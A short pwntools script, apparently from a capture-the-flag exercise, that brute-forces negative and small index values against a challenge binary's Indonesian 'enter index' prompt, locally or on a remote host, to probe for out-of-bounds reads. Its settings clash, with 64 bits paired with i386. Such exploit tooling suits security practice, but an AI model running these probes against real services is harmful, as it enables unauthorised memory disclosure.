from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "i386"

def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p

class Exploit:
    def __init__(self, p: process):
        self.p = p

    def send(self, content):
        p = self.p
        p.sendlineafter(b"Masukkan indeks: ", content)
        
def brute():
    with context.silent:
        for i in range(-60, 10):
            x, p = init()
            x.send(f"{i}".encode())
            print(p.recvline())
            
brute()